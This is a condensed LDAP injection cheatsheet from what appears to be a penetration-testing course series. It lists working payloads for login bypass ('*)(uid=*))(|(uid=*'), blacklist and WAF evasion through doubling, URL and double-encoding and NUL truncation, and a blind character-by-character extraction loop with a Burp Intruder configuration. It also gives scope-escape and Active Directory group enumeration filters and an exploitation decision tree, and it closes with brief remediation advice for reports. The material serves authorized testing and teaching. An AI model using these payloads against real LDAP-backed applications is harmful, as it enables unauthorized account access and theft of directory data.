# LDAP Injection — Cheatsheet

Quick-reference only. Every entry here is explained in full in files 01–07 (this is file 08) — use this for fast lookup during an engagement, not as your first read.

## Filter Grammar Quick Reference

| Symbol | Meaning |
|---|---|
| `&` | AND (prefix — applies to all following conditions in the group) |
| `\|` | OR (prefix) |
| `!` | NOT (negates the single following filter) |
| `=` | Equality |
| `>=` `<=` | Ordered comparison (matching-rule dependent) |
| `~=` | Approximate match |
| `*` | Wildcard |
| `(attr=*)` | Presence test |
| `\28 \29 \2a \5c \00` | Hex escapes for `( ) * \` NUL — their *absence* on user input = vulnerable |

## Step 0 — Confirm Injectability

```
*           → look for behavior change
)           → look for syntax error
)(          → compare error type vs lone )
```

## Filter Bypass / Evasion (file 03)

Run this classification *before* assuming raw payloads from files 04–06 will land:

| Observed behavior on `* ( ) \` / NUL | Defense type | Evasion to try |
|---|---|---|
| Character silently deleted | Blacklist stripping | Double it up: `*))(uid=*` instead of `*)(uid=*` |
| Whole request rejected | WAF/blacklist rejection | URL-encode (`%28 %29 %2a %5c`), then double-encode (`%2528`), then Unicode lookalikes |
| Appears as `\28 \29 \2a \5c \00` in output | Proper RFC 4515 escaping | Not bypassable here — pivot to other fields touching the same query |
| Only `[a-zA-Z0-9]` etc. accepted | Allowlist validation | Usually not bypassable via encoding — check for client-side-only enforcement, test other fields |
| NUL byte has zero effect | Modern binding (ldap3/JNDI/DSP) | NUL truncation trick not applicable here |
| NUL byte truncates trailing content | Legacy ADSI-style binding | `goodvalue\x00)(uid=*` — validator may stop reading at NUL while LDAP layer doesn't |

## Authentication Bypass (file 04)

| Goal | Payload (username field unless noted) |
|---|---|
| Log in as anyone (return-all) | `*)(uid=*))(\|(uid=*` |
| Log in as known user, blank-password style | `*)(&(uid=admin))` *(in password field, when username already resolves)* |
| Abuse a NOT-based status check | `*)(!(accountStatus=*` |

## Blind Extraction Loop (file 05)

```
Establish oracle:
  TRUE  → *)(objectClass=*
  FALSE → *)(objectClass=NonexistentValue12345

Extract character-by-character:
  *)(attribute=KNOWN_PREFIX + candidate_char + *
  → extend KNOWN_PREFIX when oracle returns TRUE
  → stop when no candidate_char returns TRUE
```

Burp Intruder setup: Sniper attack, marker at candidate-char position, Simple List/Brute-forcer payload = target alphabet, Grep-Match on confirmed TRUE indicator.

## Data Extraction / Scope Bypass (file 06)

| Goal | Payload pattern |
|---|---|
| Escape a department/scope restriction | `*))(\|(cn=*` |
| Test if an attribute exists | `*)(attributeName=*` |
| Enumerate AD group membership | `*)(memberOf=*GroupName*` |

## Decision Tree

```
Always run Step 0 (confirm injectability) before anything else.

Are * ( ) \ or NUL being blocked/altered?
  → Classify the defense type and pick an evasion from file 03 before proceeding.

Is there a login/auth feature backed by LDAP?
  → Try Authentication Bypass payloads (file 04) first — highest impact, fastest to test in Repeater.

Does a search/lookup feature reflect results directly?
  → Use Data Extraction techniques (file 06) — wildcard scope escape, attribute enumeration.

Does the app give you no visible result data, only success/fail or generic messages?
  → You're in Blind territory (file 05) — establish a true/false oracle, then automate
    extraction via Burp Intruder or the Python script template (file 07).
```

## Tooling Reminder

- **No sqlmap-equivalent exists.** Primary tools: Burp Repeater + Intruder, `ldapsearch` for lab/protocol validation, short custom Python scripts for bulk blind extraction.
- **No dedicated PortSwigger Academy lab track exists for this vulnerability class** (see file 01, section 6, for full detail). Practice via OWASP WebGoat's LDAP Injection lesson or a self-hosted OpenLDAP + custom vulnerable app (setup script in file 07, section 4).

## Defensive Reference (for report-writing)

- Parameterize LDAP queries — most modern LDAP client libraries (e.g., `ldap3`'s filter-building helpers, .NET's `System.DirectoryServices.Protocols` with proper escaping) provide safe filter construction; flag raw string concatenation as the root cause in findings.
- Escape `( ) * \` and NUL in all user-controlled filter input server-side, regardless of client-side validation.
- Authenticate via a real LDAP bind operation, never via a search-filter password comparison (Pattern A in file 04 is the anti-pattern to call out explicitly in a report).
- Apply least-privilege bind accounts for application-layer LDAP queries so that even a successful injection can't read attributes/subtrees outside what the feature legitimately needs.

## File Index

| File | Covers |
|---|---|
| 01 | Overview, classification, OWASP/CWE mapping, tooling reality, lab coverage gap |
| 02 | Filter grammar reference (read before any payload file) |
| 03 | Filter bypass and sanitization evasion |
| 04 | Authentication bypass |
| 05 | Blind LDAP injection |
| 06 | Data extraction via search filters |
| 07 | Manual exploitation methodology, Burp Intruder config, Python script, self-hosted lab |
| 08 (this file) | Condensed cheatsheet |
